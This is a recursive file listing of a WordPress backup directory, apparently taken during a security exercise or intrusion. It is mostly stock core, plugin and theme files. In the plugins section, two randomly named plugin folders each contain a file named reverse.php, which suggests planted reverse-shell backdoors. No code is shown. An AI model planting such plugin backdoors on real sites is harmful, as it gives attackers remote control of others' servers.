-rw-r--r-- 1 www-data www-data  737 Nov 14  2013 password-strength-meter.min.js
-rw-r--r-- 1 www-data www-data 5.3K Mar 10  2016 plugin-install.js
-rw-r--r-- 1 www-data www-data 2.0K Mar 10  2016 plugin-install.min.js
-rw-r--r-- 1 www-data www-data  30K Mar 12  2016 post.js
-rw-r--r-- 1 www-data www-data  18K Mar 12  2016 post.min.js
-rw-r--r-- 1 www-data www-data 6.8K Jan 14  2016 postbox.js
-rw-r--r-- 1 www-data www-data 4.1K Jan 13  2016 postbox.min.js
-rw-r--r-- 1 www-data www-data  26K Nov  7  2015 press-this.js
-rw-r--r-- 1 www-data www-data  12K Nov  7  2015 press-this.min.js
-rw-r--r-- 1 www-data www-data  33K Feb 25  2016 revisions.js
-rw-r--r-- 1 www-data www-data  18K Jun 28  2015 revisions.min.js
-rw-r--r-- 1 www-data www-data  777 May 31  2015 set-post-thumbnail.js
-rw-r--r-- 1 www-data www-data  525 May 31  2015 set-post-thumbnail.min.js
-rw-r--r-- 1 www-data www-data 5.4K Dec  5  2013 svg-painter.js
-rw-r--r-- 1 www-data www-data 2.4K Jun 28  2015 svg-painter.min.js
-rw-r--r-- 1 www-data www-data 4.9K Oct 20  2015 tags-box.js
-rw-r--r-- 1 www-data www-data 2.7K Oct 20  2015 tags-box.min.js
-rw-r--r-- 1 www-data www-data 2.6K Mar 12  2015 tags.js
-rw-r--r-- 1 www-data www-data 1.6K Mar 12  2015 tags.min.js
-rw-r--r-- 1 www-data www-data  47K Mar 30  2016 theme.js
-rw-r--r-- 1 www-data www-data  23K Mar 30  2016 theme.min.js
-rw-r--r-- 1 www-data www-data  17K Feb 17  2016 updates.js
-rw-r--r-- 1 www-data www-data 9.0K Feb 17  2016 updates.min.js
-rw-r--r-- 1 www-data www-data  12K Dec 11  2015 user-profile.js
-rw-r--r-- 1 www-data www-data 5.9K Dec 11  2015 user-profile.min.js
-rw-r--r-- 1 www-data www-data 1.1K Jan 27  2014 user-suggest.js
-rw-r--r-- 1 www-data www-data  679 Jan 27  2014 user-suggest.min.js
-rw-r--r-- 1 www-data www-data  17K Oct 20  2015 widgets.js
-rw-r--r-- 1 www-data www-data 9.8K Oct 20  2015 widgets.min.js
-rw-r--r-- 1 www-data www-data 3.0K Jul 27  2015 word-count.js
-rw-r--r-- 1 www-data www-data 1.5K Jul 27  2015 word-count.min.js
-rw-r--r-- 1 www-data www-data  685 Jun  1  2015 wp-fullscreen-stub.js
-rw-r--r-- 1 www-data www-data  331 Jun  1  2015 wp-fullscreen-stub.min.js
-rw-r--r-- 1 www-data www-data  628 Nov 14  2013 xfn.js
-rw-r--r-- 1 www-data www-data  441 Nov 14  2013 xfn.min.js

/var/www/backup_wordpress/wp-admin/maint:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 7.0K Dec  8  2015 repair.php

/var/www/backup_wordpress/wp-admin/network:
total 208K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  342 Sep 24  2013 about.php
-rw-r--r-- 1 www-data www-data  949 Apr 11  2014 admin.php
-rw-r--r-- 1 www-data www-data  346 Sep 24  2013 credits.php
-rw-r--r-- 1 www-data www-data  934 Nov 30  2014 edit.php
-rw-r--r-- 1 www-data www-data  348 Sep 24  2013 freedoms.php
-rw-r--r-- 1 www-data www-data 2.9K Jun 27  2015 index.php
-rw-r--r-- 1 www-data www-data 4.1K May 19  2015 menu.php
-rw-r--r-- 1 www-data www-data  358 Sep 24  2013 plugin-editor.php
-rw-r--r-- 1 www-data www-data  469 Sep 24  2013 plugin-install.php
-rw-r--r-- 1 www-data www-data  346 Sep 24  2013 plugins.php
-rw-r--r-- 1 www-data www-data  351 Sep 24  2013 profile.php
-rw-r--r-- 1 www-data www-data  18K Mar 30  2016 settings.php
-rw-r--r-- 1 www-data www-data  344 Sep 24  2013 setup.php
-rw-r--r-- 1 www-data www-data 9.2K Feb 24  2016 site-info.php
-rw-r--r-- 1 www-data www-data 8.9K Mar  3  2016 site-new.php
-rw-r--r-- 1 www-data www-data 7.7K Jan  5  2016 site-settings.php
-rw-r--r-- 1 www-data www-data 7.8K Jan  5  2016 site-themes.php
-rw-r--r-- 1 www-data www-data  13K Jan  5  2016 site-users.php
-rw-r--r-- 1 www-data www-data  11K Feb 25  2016 sites.php
-rw-r--r-- 1 www-data www-data  356 Sep 24  2013 theme-editor.php
-rw-r--r-- 1 www-data www-data  466 Sep 24  2013 theme-install.php
-rw-r--r-- 1 www-data www-data  12K Feb 28  2016 themes.php
-rw-r--r-- 1 www-data www-data  350 Sep 24  2013 update-core.php
-rw-r--r-- 1 www-data www-data  537 Sep 24  2013 update.php
-rw-r--r-- 1 www-data www-data 4.6K Jan 27  2016 upgrade.php
-rw-r--r-- 1 www-data www-data  350 Sep 24  2013 user-edit.php
-rw-r--r-- 1 www-data www-data 4.9K Feb 24  2016 user-new.php
-rw-r--r-- 1 www-data www-data 8.2K Jan 14  2016 users.php

/var/www/backup_wordpress/wp-admin/user:
total 40K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  275 Sep 24  2013 about.php
-rw-r--r-- 1 www-data www-data  841 Apr 11  2014 admin.php
-rw-r--r-- 1 www-data www-data  279 Sep 24  2013 credits.php
-rw-r--r-- 1 www-data www-data  281 Sep 24  2013 freedoms.php
-rw-r--r-- 1 www-data www-data  269 Nov  4  2014 index.php
-rw-r--r-- 1 www-data www-data  700 May  6  2014 menu.php
-rw-r--r-- 1 www-data www-data  270 Nov  4  2014 profile.php
-rw-r--r-- 1 www-data www-data  268 Nov  4  2014 user-edit.php

/var/www/backup_wordpress/wp-content:
total 28K
drwxr-xr-x 6 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 5 www-data www-data 4.0K Mar  7 12:05 ..
-rw-r--r-- 1 www-data www-data   28 Jan  8  2012 index.php
drwxr-xr-x 5 www-data www-data 4.0K Jul  2 14:19 plugins
drwxr-xr-x 5 www-data www-data 4.0K Apr 12  2016 themes
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 upgrade
drwxr-xr-x 3 www-data www-data 4.0K Jul  2 14:19 uploads

/var/www/backup_wordpress/wp-content/plugins:
total 28K
drwxr-xr-x 5 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 6 www-data www-data 4.0K Jul  2 14:19 ..
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 akismet
-rw-r--r-- 1 www-data www-data 2.3K May 22  2013 hello.php
-rw-r--r-- 1 www-data www-data   28 Jun  5  2014 index.php
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 nnafrim
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 vzmchkq

/var/www/backup_wordpress/wp-content/plugins/akismet:
total 164K
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 5 www-data www-data 4.0K Jul  2 14:19 ..
-rw-r--r-- 1 www-data www-data  616 Nov 19  2014 .htaccess
-rw-r--r-- 1 www-data www-data  18K Aug 23  2015 LICENSE.txt
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 _inc
-rw-r--r-- 1 www-data www-data 2.4K Apr  1  2016 akismet.php
-rw-r--r-- 1 www-data www-data  39K Jan  6  2016 class.akismet-admin.php
-rw-r--r-- 1 www-data www-data 2.7K Mar 20  2014 class.akismet-widget.php
-rw-r--r-- 1 www-data www-data  45K Mar 31  2016 class.akismet.php
-rw-r--r-- 1 www-data www-data   26 Mar 10  2014 index.php
-rw-r--r-- 1 www-data www-data  14K Apr  1  2016 readme.txt
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 views
-rw-r--r-- 1 www-data www-data 6.3K Mar 17  2015 wrapper.php

/var/www/backup_wordpress/wp-content/plugins/akismet/_inc:
total 36K
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 8.6K Dec 26  2015 akismet.css
-rw-r--r-- 1 www-data www-data 6.2K Dec 26  2015 akismet.js
-rw-r--r-- 1 www-data www-data  700 Jul  2  2014 form.js
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 img

/var/www/backup_wordpress/wp-content/plugins/akismet/_inc/img:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 4.9K Mar 10  2014 logo-full-2x.png

/var/www/backup_wordpress/wp-content/plugins/akismet/views:
total 52K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 4 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  11K Dec 11  2015 config.php
-rw-r--r-- 1 www-data www-data  595 Sep  8  2015 get.php
-rw-r--r-- 1 www-data www-data 8.5K Dec 26  2015 notice.php
-rw-r--r-- 1 www-data www-data 6.4K Sep  8  2015 start.php
-rw-r--r-- 1 www-data www-data  551 Apr 14  2014 stats.php
-rw-r--r-- 1 www-data www-data  761 Sep 23  2015 strict.php

/var/www/backup_wordpress/wp-content/plugins/nnafrim:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 5 www-data www-data 4.0K Jul  2 14:19 ..
-rw-r--r-- 1 www-data www-data 5.8K Jul  2 14:19 reverse.php

/var/www/backup_wordpress/wp-content/plugins/vzmchkq:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 5 www-data www-data 4.0K Jul  2 14:19 ..
-rw-r--r-- 1 www-data www-data 5.8K Jul  2 14:19 reverse.php

/var/www/backup_wordpress/wp-content/themes:
total 24K
drwxr-xr-x 5 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 6 www-data www-data 4.0K Jul  2 14:19 ..
-rw-r--r-- 1 www-data www-data   28 Jun  5  2014 index.php
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 twentyfifteen
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 twentyfourteen
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 twentysixteen

/var/www/backup_wordpress/wp-content/themes/twentyfifteen:
total 792K
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 5 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  809 Dec 16  2014 404.php
-rw-r--r-- 1 www-data www-data 1.9K Dec 11  2014 archive.php
-rw-r--r-- 1 www-data www-data 1.2K Dec 16  2014 author-bio.php
-rw-r--r-- 1 www-data www-data 1.5K Dec 16  2014 comments.php
-rw-r--r-- 1 www-data www-data 1.8K Dec 16  2014 content-link.php
-rw-r--r-- 1 www-data www-data 1.2K Dec 16  2014 content-none.php
-rw-r--r-- 1 www-data www-data 1.1K Dec 16  2014 content-page.php
-rw-r--r-- 1 www-data www-data 1.1K Dec 16  2014 content-search.php
-rw-r--r-- 1 www-data www-data 1.7K Dec 16  2014 content.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 css
-rw-r--r-- 1 www-data www-data  823 Dec 16  2014 footer.php
-rw-r--r-- 1 www-data www-data  13K Mar 23  2016 functions.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 genericons
-rw-r--r-- 1 www-data www-data 1.9K Mar  9  2016 header.php
-rw-r--r-- 1 www-data www-data 2.9K Dec 16  2014 image.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 inc
-rw-r--r-- 1 www-data www-data 1.8K Dec 11  2014 index.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 js
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 languages
-rw-r--r-- 1 www-data www-data  902 Nov 19  2014 page.php
-rw-r--r-- 1 www-data www-data 3.2K Apr  8  2016 readme.txt
-rw-r--r-- 1 www-data www-data  13K Sep 26  2015 rtl.css
-rw-r--r-- 1 www-data www-data 563K Mar 18  2016 screenshot.png
-rw-r--r-- 1 www-data www-data 1.4K Dec 16  2014 search.php
-rw-r--r-- 1 www-data www-data 1.3K Nov 19  2014 sidebar.php
-rw-r--r-- 1 www-data www-data 1.5K Dec 12  2014 single.php
-rw-r--r-- 1 www-data www-data  96K Apr  8  2016 style.css

/var/www/backup_wordpress/wp-content/themes/twentyfifteen/css:
total 36K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 5.7K Dec 23  2015 editor-style.css
-rw-r--r-- 1 www-data www-data  14K Jan 15  2015 ie.css
-rw-r--r-- 1 www-data www-data 1.2K Dec 10  2014 ie7.css

/var/www/backup_wordpress/wp-content/themes/twentyfifteen/genericons:
total 212K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.4K Oct 14  2014 COPYING.txt
-rw-r--r-- 1 www-data www-data  23K Oct 14  2014 Genericons.eot
-rw-r--r-- 1 www-data www-data  78K Oct 14  2014 Genericons.svg
-rw-r--r-- 1 www-data www-data  23K Oct 14  2014 Genericons.ttf
-rw-r--r-- 1 www-data www-data  15K Oct 14  2014 Genericons.woff
-rw-r--r-- 1 www-data www-data  18K Oct 14  2014 LICENSE.txt
-rw-r--r-- 1 www-data www-data 6.5K Oct 14  2014 README.md
-rw-r--r-- 1 www-data www-data  27K Dec 10  2014 genericons.css

/var/www/backup_wordpress/wp-content/themes/twentyfifteen/inc:
total 60K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.2K Nov 25  2014 back-compat.php
-rw-r--r-- 1 www-data www-data 9.3K Jul  6  2015 custom-header.php
-rw-r--r-- 1 www-data www-data  21K Mar  1  2016 customizer.php
-rw-r--r-- 1 www-data www-data 8.2K Mar 10  2016 template-tags.php

/var/www/backup_wordpress/wp-content/themes/twentyfifteen/js:
total 36K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.9K Dec 16  2014 color-scheme-control.js
-rw-r--r-- 1 www-data www-data  832 Dec 16  2014 customize-preview.js
-rw-r--r-- 1 www-data www-data 5.8K Mar 15  2016 functions.js
-rw-r--r-- 1 www-data www-data 2.4K Oct 14  2014 html5.js
-rw-r--r-- 1 www-data www-data  487 Dec 10  2014 keyboard-image-navigation.js
-rw-r--r-- 1 www-data www-data  727 Oct 14  2014 skip-link-focus-fix.js

/var/www/backup_wordpress/wp-content/themes/twentyfifteen/languages:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 7 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 7.0K Apr  8  2016 twentyfifteen.pot

/var/www/backup_wordpress/wp-content/themes/twentyfourteen:
total 1.2M
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 5 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  719 Dec  5  2013 404.php
-rw-r--r-- 1 www-data www-data 2.2K Apr 12  2015 archive.php
-rw-r--r-- 1 www-data www-data 1.9K Apr 12  2015 author.php
-rw-r--r-- 1 www-data www-data 1.6K Apr 12  2015 category.php
-rw-r--r-- 1 www-data www-data 2.3K Jan 20  2015 comments.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content-aside.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content-audio.php
-rw-r--r-- 1 www-data www-data 1.1K Dec  5  2013 content-featured-post.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content-gallery.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content-image.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content-link.php
-rw-r--r-- 1 www-data www-data  961 Oct 11  2013 content-none.php
-rw-r--r-- 1 www-data www-data  871 Dec  3  2013 content-page.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content-quote.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content-video.php
-rw-r--r-- 1 www-data www-data 2.3K Dec  9  2014 content.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 css
-rw-r--r-- 1 www-data www-data  945 Jan 20  2015 featured-content.php
-rw-r--r-- 1 www-data www-data  729 Apr 27  2015 footer.php
-rw-r--r-- 1 www-data www-data  17K Mar 21  2016 functions.php
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 genericons
-rw-r--r-- 1 www-data www-data 2.4K Mar 16  2015 header.php
-rw-r--r-- 1 www-data www-data 2.7K Jan 20  2015 image.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 images
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 inc
-rw-r--r-- 1 www-data www-data 1.6K Apr 12  2015 index.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 js
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 languages
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 page-templates
-rw-r--r-- 1 www-data www-data 1.2K Dec  6  2013 page.php
-rw-r--r-- 1 www-data www-data 3.4K Apr  8  2016 readme.txt
-rw-r--r-- 1 www-data www-data  16K Apr 27  2015 rtl.css
-rw-r--r-- 1 www-data www-data 912K Mar 18  2016 screenshot.png
-rw-r--r-- 1 www-data www-data 1.3K Dec  3  2013 search.php
-rw-r--r-- 1 www-data www-data  340 Nov 18  2013 sidebar-content.php
-rw-r--r-- 1 www-data www-data  395 Nov 18  2013 sidebar-footer.php
-rw-r--r-- 1 www-data www-data  848 Nov 27  2013 sidebar.php
-rw-r--r-- 1 www-data www-data 1.1K Dec  3  2013 single.php
-rw-r--r-- 1 www-data www-data  76K Apr  8  2016 style.css
-rw-r--r-- 1 www-data www-data 1.6K Apr 12  2015 tag.php
-rw-r--r-- 1 www-data www-data 2.4K Apr 12  2015 taxonomy-post_format.php

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/css:
total 48K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  12K Jul 25  2015 editor-style.css
-rw-r--r-- 1 www-data www-data  25K Jul 11  2014 ie.css

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons:
total 96K
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.4K Nov 12  2013 COPYING.txt
-rw-r--r-- 1 www-data www-data  18K Jun  6  2014 Genericons-Regular.otf
-rw-r--r-- 1 www-data www-data  18K Nov 12  2013 LICENSE.txt
-rw-r--r-- 1 www-data www-data 5.8K Jun  6  2014 README.txt
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 font
-rw-r--r-- 1 www-data www-data  31K Jun  6  2014 genericons.css

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/genericons/font:
total 112K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 3 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  15K Jun  6  2014 genericons-regular-webfont.eot
-rw-r--r-- 1 www-data www-data  40K Jun  6  2014 genericons-regular-webfont.svg
-rw-r--r-- 1 www-data www-data  27K Jun  6  2014 genericons-regular-webfont.ttf
-rw-r--r-- 1 www-data www-data  17K Jun  6  2014 genericons-regular-webfont.woff

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/images:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.2K Nov 19  2013 pattern-dark.svg
-rw-r--r-- 1 www-data www-data  540 Oct 30  2013 pattern-light.svg

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/inc:
total 64K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.2K Oct 15  2014 back-compat.php
-rw-r--r-- 1 www-data www-data 4.5K Jan 20  2015 custom-header.php
-rw-r--r-- 1 www-data www-data 6.5K Mar  1  2016 customizer.php
-rw-r--r-- 1 www-data www-data  15K Feb 25  2016 featured-content.php
-rw-r--r-- 1 www-data www-data 7.1K Feb 20  2015 template-tags.php
-rw-r--r-- 1 www-data www-data  11K Mar 21  2016 widgets.php

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/js:
total 52K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  950 Oct 15  2014 customizer.js
-rw-r--r-- 1 www-data www-data  329 Dec  5  2013 featured-content-admin.js
-rw-r--r-- 1 www-data www-data 6.0K Mar 21  2016 functions.js
-rw-r--r-- 1 www-data www-data 2.4K Feb 25  2014 html5.js
-rw-r--r-- 1 www-data www-data  497 Jan 20  2015 keyboard-image-navigation.js
-rw-r--r-- 1 www-data www-data  19K Jan 20  2015 slider.js

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/languages:
total 20K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  11K Apr  8  2016 twentyfourteen.pot

/var/www/backup_wordpress/wp-content/themes/twentyfourteen/page-templates:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 9 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.3K Dec  3  2013 contributors.php
-rw-r--r-- 1 www-data www-data  939 Dec  3  2013 full-width.php

/var/www/backup_wordpress/wp-content/themes/twentysixteen:
total 648K
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 5 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data  879 Apr 12  2016 404.php
-rw-r--r-- 1 www-data www-data 2.0K Apr 12  2016 archive.php
-rw-r--r-- 1 www-data www-data 2.0K Apr 12  2016 comments.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 css
-rw-r--r-- 1 www-data www-data 1.9K Apr 12  2016 footer.php
-rw-r--r-- 1 www-data www-data  15K Apr 12  2016 functions.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 genericons
-rw-r--r-- 1 www-data www-data 4.1K Apr 12  2016 header.php
-rw-r--r-- 1 www-data www-data 3.5K Apr 12  2016 image.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 inc
-rw-r--r-- 1 www-data www-data 1.8K Apr 12  2016 index.php
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 js
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 languages
-rw-r--r-- 1 www-data www-data  980 Apr 12  2016 page.php
-rw-r--r-- 1 www-data www-data 2.9K Apr 12  2016 readme.txt
-rw-r--r-- 1 www-data www-data  13K Apr 12  2016 rtl.css
-rw-r--r-- 1 www-data www-data 453K Apr 12  2016 screenshot.png
-rw-r--r-- 1 www-data www-data 1.5K Apr 12  2016 search.php
-rw-r--r-- 1 www-data www-data  744 Apr 12  2016 searchform.php
-rw-r--r-- 1 www-data www-data  794 Apr 12  2016 sidebar-content-bottom.php
-rw-r--r-- 1 www-data www-data  390 Apr 12  2016 sidebar.php
-rw-r--r-- 1 www-data www-data 1.7K Apr 12  2016 single.php
-rw-r--r-- 1 www-data www-data  68K Apr 12  2016 style.css
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 template-parts

/var/www/backup_wordpress/wp-content/themes/twentysixteen/css:
total 28K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 6.5K Apr 12  2016 editor-style.css
-rw-r--r-- 1 www-data www-data  748 Apr 12  2016 ie.css
-rw-r--r-- 1 www-data www-data 2.6K Apr 12  2016 ie7.css
-rw-r--r-- 1 www-data www-data 3.4K Apr 12  2016 ie8.css

/var/www/backup_wordpress/wp-content/themes/twentysixteen/genericons:
total 212K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.4K Apr 12  2016 COPYING.txt
-rw-r--r-- 1 www-data www-data  22K Apr 12  2016 Genericons.eot
-rw-r--r-- 1 www-data www-data  76K Apr 12  2016 Genericons.svg
-rw-r--r-- 1 www-data www-data  22K Apr 12  2016 Genericons.ttf
-rw-r--r-- 1 www-data www-data  14K Apr 12  2016 Genericons.woff
-rw-r--r-- 1 www-data www-data  18K Apr 12  2016 LICENSE.txt
-rw-r--r-- 1 www-data www-data  11K Apr 12  2016 README.md
-rw-r--r-- 1 www-data www-data  28K Apr 12  2016 genericons.css

/var/www/backup_wordpress/wp-content/themes/twentysixteen/inc:
total 52K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.3K Apr 12  2016 back-compat.php
-rw-r--r-- 1 www-data www-data  30K Apr 12  2016 customizer.php
-rw-r--r-- 1 www-data www-data 8.0K Apr 12  2016 template-tags.php

/var/www/backup_wordpress/wp-content/themes/twentysixteen/js:
total 44K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 2.9K Apr 12  2016 color-scheme-control.js
-rw-r--r-- 1 www-data www-data 1.1K Apr 12  2016 customize-preview.js
-rw-r--r-- 1 www-data www-data 6.7K Apr 12  2016 functions.js
-rw-r--r-- 1 www-data www-data  11K Apr 12  2016 html5.js
-rw-r--r-- 1 www-data www-data  527 Apr 12  2016 keyboard-image-navigation.js
-rw-r--r-- 1 www-data www-data 1.1K Apr 12  2016 skip-link-focus-fix.js

/var/www/backup_wordpress/wp-content/themes/twentysixteen/languages:
total 16K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 7.5K Apr 12  2016 twentysixteen.pot

/var/www/backup_wordpress/wp-content/themes/twentysixteen/template-parts:
total 32K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2016 .
drwxr-xr-x 8 www-data www-data 4.0K Apr 12  2016 ..
-rw-r--r-- 1 www-data www-data 1.2K Apr 12  2016 biography.php
-rw-r--r-- 1 www-data www-data 1.1K Apr 12  2016 content-none.php
-rw-r--r-- 1 www-data www-data 1.2K Apr 12  2016 content-page.php
-rw-r--r-- 1 www-data www-data 1.3K Apr 12  2016 content-search.php
-rw-r--r-- 1 www-data www-data 1.5K Apr 12  2016 content-single.php
-rw-r--r-- 1 www-data www-data 1.7K Apr 12  2016 content.php

/var/www/backup_wordpress/wp-content/upgrade:
total 8.0K
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 6 www-data www-data 4.0K Jul  2 14:19 ..

/var/www/backup_wordpress/wp-content/uploads:
total 12K
drwxr-xr-x 3 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 6 www-data www-data 4.0K Jul  2 14:19 ..
drwxr-xr-x 3 www-data www-data 4.0K Jul  2 14:19 2018

/var/www/backup_wordpress/wp-content/uploads/2018:
total 12K
drwxr-xr-x 3 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 3 www-data www-data 4.0K Jul  2 14:19 ..
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 07

/var/www/backup_wordpress/wp-content/uploads/2018/07:
total 8.0K
drwxr-xr-x 2 www-data www-data 4.0K Jul  2 14:19 .
drwxr-xr-x 3 www-data www-data 4.0K Jul  2 14:19 ..

/var/www/backup_wordpress/wp-includes:
total 4.8M
drwxr-xr-x 16 www-data www-data  12K Apr 12  2016 .
drwxr-xr-x  5 www-data www-data 4.0K Mar  7 12:05 ..
drwxr-xr-x  2 www-data www-data 4.0K Apr 12  2016 ID3
drwxr-xr-x  9 www-data www-data 4.0K Apr 12  2016 SimplePie
drwxr-xr-x  3 www-data www-data 4.0K Apr 12  2016 Text
-rw-r--r--  1 www-data www-data  25K Mar  9  2016 admin-bar.php
-rw-r--r--  1 www-data www-data  11K Jun 28  2015 atomlib.php
-rw-r--r--  1 www-data www-data  15K Jan 27  2016 author-template.php
-rw-r--r--  1 www-data www-data  12K Jun 22  2015 bookmark-template.php
-rw-r--r--  1 www-data www-data  14K Dec 18  2015 bookmark.php
-rw-r--r--  1 www-data www-data  22K Feb 25  2016 cache.php
